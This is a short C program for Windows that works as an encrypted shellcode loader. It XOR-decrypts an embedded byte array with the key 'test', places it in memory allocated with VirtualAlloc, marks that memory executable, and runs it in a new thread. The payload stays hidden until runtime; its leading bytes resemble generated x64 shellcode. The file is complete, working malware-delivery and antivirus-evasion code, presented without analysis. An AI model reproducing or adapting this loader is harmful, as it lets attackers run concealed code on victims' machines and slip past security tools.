#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void XOR_dec(char* data, size_t data_len, char* key, size_t key_len) {

	int k;

	k = 0;
	for (int i = 0; i < data_len; i++) {
		if (k == key_len - 1) k = 0;

		data[i] = data[i] ^ key[k];
		k++;
	}

	
}


int main(void) {

	void * exec_mem;
	unsigned char enc_payload_value;
	unsigned char enc_payload[] = { 0x88, 0x2d, 0xf0, 0x90, 0x84, 0x8d, 0xbf, 0x74, 0x74, 0x65, 0x32, 0x25, 0x35, 0x35, 0x21, 0x25, 0x22, 0x2d, 0x42, 0xa6, 0x11, 0x2d, 0xf8, 0x26, 0x14, 0x2d, 0xf8, 0x26, 0x6c, 0x2d, 0xf8, 0x26, 0x54, 0x2d, 0xf8, 0x06, 0x24, 0x28, 0x42, 0xbd, 0x3c, 0x6a, 0xc4, 0x3e, 0x3e, 0x2d, 0x42, 0xb4, 0xd8, 0x59, 0x12, 0x08, 0x76, 0x49, 0x53, 0x35, 0xb5, 0xac, 0x7e, 0x35, 0x75, 0xa4, 0x91, 0x99, 0x26, 0x2d, 0xf8, 0x26, 0x54, 0x24, 0x22, 0xff, 0x36, 0x59, 0x3b, 0x75, 0xa4, 0x03, 0xf2, 0x0c, 0x6c, 0x6e, 0x71, 0x7b, 0xf1, 0x17, 0x73, 0x74, 0x74, 0xee, 0xf3, 0xfc, 0x74, 0x65, 0x73, 0x3c, 0xf1, 0xa5, 0x07, 0x13, 0x3c, 0x64, 0xa3, 0x24, 0xff, 0x2d, 0x6b, 0x30, 0xff, 0x25, 0x53, 0x3d, 0x75, 0xb5, 0x90, 0x22, 0x39, 0x54, 0xba, 0x3c, 0x8b, 0xac, 0x32, 0xff, 0x40, 0xed, 0x3b, 0x75, 0xa2, 0x2d, 0x42, 0xb4, 0x35, 0xa4, 0xba, 0x79, 0xd8, 0x24, 0x72, 0xb5, 0x4c, 0x85, 0x06, 0x85, 0x38, 0x66, 0x3f, 0x50, 0x7c, 0x20, 0x4a, 0xa5, 0x01, 0xbd, 0x2b, 0x30, 0xff, 0x25, 0x57, 0x3d, 0x75, 0xb5, 0x15, 0x35, 0xff, 0x69, 0x3b, 0x30, 0xff, 0x25, 0x6f, 0x3d, 0x75, 0xb5, 0x32, 0xff, 0x70, 0xed, 0x3b, 0x75, 0xa4, 0x24, 0x2b, 0x35, 0x2c, 0x3b, 0x2a, 0x2e, 0x35, 0x3d, 0x32, 0x2d, 0x35, 0x3f, 0x3b, 0xf7, 0x98, 0x45, 0x32, 0x26, 0x8b, 0x85, 0x2b, 0x35, 0x2d, 0x3f, 0x3b, 0xff, 0x66, 0x8c, 0x38, 0x8b, 0x8b, 0x9a, 0x2e, 0x3d, 0xca, 0x12, 0x00, 0x46, 0x2b, 0x56, 0x41, 0x74, 0x74, 0x24, 0x25, 0x3d, 0xfd, 0x83, 0x3b, 0xf5, 0x98, 0xc5, 0x72, 0x74, 0x74, 0x2c, 0xfa, 0x91, 0x3d, 0xd9, 0x71, 0x74, 0x6b, 0xf5, 0xb3, 0xdc, 0x45, 0x1c, 0x32, 0x20, 0x3d, 0xec, 0x97, 0x38, 0xfd, 0x94, 0x32, 0xce, 0x38, 0x12, 0x55, 0x73, 0x8b, 0xb0, 0x3f, 0xfd, 0x9e, 0x0d, 0x72, 0x75, 0x74, 0x65, 0x2a, 0x35, 0xce, 0x4c, 0xf3, 0x1f, 0x74, 0x9a, 0xa6, 0x1e, 0x7e, 0x24, 0x2d, 0x24, 0x24, 0x28, 0x42, 0xbd, 0x39, 0x54, 0xb3, 0x3c, 0x8b, 0xa5, 0x3b, 0xfd, 0xb6, 0x2d, 0x8c, 0xb4, 0x3c, 0xec, 0xb2, 0x35, 0xce, 0x8f, 0x7c, 0xab, 0x94, 0x9a, 0xa6, 0x3c, 0xfd, 0xa2, 0x19, 0x64, 0x35, 0x3d, 0x3f, 0xfd, 0x96, 0x2d, 0xfa, 0x8d, 0x35, 0xdf, 0xea, 0xd1, 0x00, 0x04, 0x8c, 0xa1, 0xf1, 0xa5, 0x07, 0x7e, 0x3d, 0x9a, 0xbd, 0x01, 0x91, 0x8d, 0xe0, 0x74, 0x74, 0x65, 0x3b, 0xf7, 0x98, 0x75, 0x3b, 0xfd, 0x96, 0x28, 0x42, 0xbd, 0x1e, 0x61, 0x32, 0x2c, 0x3c, 0xec, 0x8a, 0x35, 0xce, 0x67, 0xaa, 0xbc, 0x2b, 0x9a, 0xa6, 0xf7, 0x8c, 0x65, 0x0d, 0x21, 0x3c, 0xe6, 0xb7, 0x54, 0x2a, 0xec, 0x85, 0x1e, 0x34, 0x24, 0x2a, 0x1c, 0x74, 0x75, 0x73, 0x74, 0x35, 0x3d, 0x3b, 0xfd, 0x86, 0x2d, 0x42, 0xbd, 0x35, 0xdf, 0x2b, 0xd0, 0x27, 0x80, 0x8c, 0xa1, 0x3c, 0xec, 0xb0, 0x3d, 0xfd, 0xa2, 0x3e, 0x45, 0xbd, 0x2c, 0xfa, 0x84, 0x3c, 0xec, 0xa9, 0x3c, 0xfd, 0x9c, 0x32, 0xce, 0x76, 0xbc, 0xbb, 0x2b, 0x8b, 0xb0, 0xf0, 0x8c, 0x74, 0x18, 0x5b, 0x2c, 0x35, 0x32, 0x2a, 0x1c, 0x74, 0x25, 0x73, 0x74, 0x35, 0x3d, 0x19, 0x74, 0x2e, 0x24, 0xc9, 0x7f, 0x5b, 0x6a, 0x43, 0x8b, 0xa1, 0x32, 0x2a, 0x35, 0xce, 0x10, 0x1d, 0x39, 0x15, 0x9a, 0xa6, 0x3d, 0x8b, 0xab, 0x9a, 0x48, 0x8b, 0x9a, 0x8c, 0x3c, 0x75, 0xa6, 0x3b, 0x5d, 0xb2, 0x2d, 0xf6, 0x82, 0x01, 0xd1, 0x32, 0x8b, 0x93, 0x3d, 0x19, 0x74, 0x2d, 0x2c, 0xb4, 0xb6, 0x84, 0xd0, 0xd1, 0x22, 0x8b, 0xb0,  };
	unsigned int enc_payload_len = sizeof(enc_payload);

	char key[] = "test";
	BOOL rv;
	DWORD oldprotect = 0;
	HANDLE th;

	exec_mem = VirtualAlloc(0, enc_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		
	XOR_dec((char*)enc_payload, enc_payload_len, key, sizeof(key));
	RtlMoveMemory(exec_mem, enc_payload, enc_payload_len);

	rv = VirtualProtect(exec_mem, enc_payload_len, PAGE_EXECUTE_READ, &oldprotect);

	// If all good, launch the payload
	if (rv != 0) {
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
		WaitForSingleObject(th, -1);
	}

	return 0;
}
